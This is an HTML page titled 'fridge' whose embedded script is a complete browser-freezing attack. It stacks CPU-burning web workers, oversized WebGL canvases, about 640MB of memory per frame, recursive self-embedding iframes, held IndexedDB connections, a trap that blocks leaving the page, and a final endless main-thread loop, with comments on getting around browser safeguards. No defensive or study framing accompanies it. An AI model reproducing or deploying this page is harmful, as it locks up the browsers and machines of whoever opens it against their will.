<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>fridge</title>
<style>
  html,body{margin:0;height:100%;background:#000;color:#2a2a2a;
    font-family:monospace;overflow:hidden}
  iframe{display:none}
</style>
</head>
<body>
<script>
(() => {
  const q = new URLSearchParams(location.search);
  const depth = parseInt(q.get('d') || '0', 10);
  const MAX_DEPTH = 4;         // 2^1..2^4 = 30 frames total at this depth
  const WORKERS_PER_FRAME = (navigator.hardwareConcurrency || 4) * 2;

  // ---- 1. Worker spin pool ----
  // Tight FP loop, no allocation: sustained burn without OOM-crashing.
  // Every iframe spawns its own pool, so worker count scales with depth.
  const spinSrc = `
    self.onmessage = () => {
      let x = 0.0001;
      for (;;) {
        x = Math.sqrt(x + Math.PI);
        if (x > 1e9) x = 0.0001;
      }
    };
  `;
  let spinUrl;
  const workers = [];
  try {
    spinUrl = URL.createObjectURL(new Blob([spinSrc], {type: 'application/javascript'}));
    for (let i = 0; i < WORKERS_PER_FRAME; i++) {
      const w = new Worker(spinUrl);
      w.postMessage(0);
      workers.push(w);
    }
  } catch (e) {}

  // ---- 2. GPU / compositor pressure ----
  // Browsers cap live WebGL contexts (~16 per page); the allocation
  // churn and huge backing stores still slam the compositor layers.
  const gl = [];
  try {
    for (let i = 0; i < 256; i++) {
      const c = document.createElement('canvas');
      c.width = 4096;
      c.height = 4096;
      c.style.display = 'none';
      document.body.appendChild(c);
      const ctx = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (ctx) gl.push(ctx);
    }
  } catch (e) {}

  // ---- 3. Bounded memory pressure (~640MB per frame) ----
  // Bounded so the tab freezes and stays frozen instead of OOMing
  // out of the process and taking the whole renderer down.
  const hog = [];
  try {
    for (let i = 0; i < 80; i++) {
      hog.push(new Uint8Array(1 << 23).fill(i)); // 8MB each
    }
  } catch (e) {}

  // ---- 4. Iframe recursion ----
  // Each child is its own browsing context with its own event loop
  // and its own spin pool. Sites without site isolation still give
  // each frame a separate agent cluster, so the spins stack.
  if (depth < MAX_DEPTH) {
    for (let i = 0; i < 2; i++) {
      const f = document.createElement('iframe');
      f.src = location.pathname + '?d=' + (depth + 1);
      document.body.appendChild(f);
    }
  }

  // ---- 5. IndexedDB open handles ----
  // Block clean shutdown; the connection stays pending.
  try {
    for (let i = 0; i < 16; i++) indexedDB.open('freeze-' + i, 1);
  } catch (e) {}

  // ---- 6. beforeunload trap ----
  // One user gesture required in modern Chrome for the prompt to fire;
  // still covers Ctrl+R / link-clicks / reload attempts.
  window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = '';
    return '';
  });

  // ---- 7. Main thread lock ----
  // Give children 150ms to dispatch their network request, spin up,
  // and lock themselves before we seal this frame. Then seal it.
  // The tight loop also slowly grows the heap (~4MB/iter) so the
  // process keeps climbing after the spin starts.
  const sealMain = () => {
    for (;;) {
      try { hog.push(new Uint8Array(1 << 22)); } catch (e) {}
    }
  };
  setTimeout(sealMain, 150);
})();
</script>
</body>
</html>
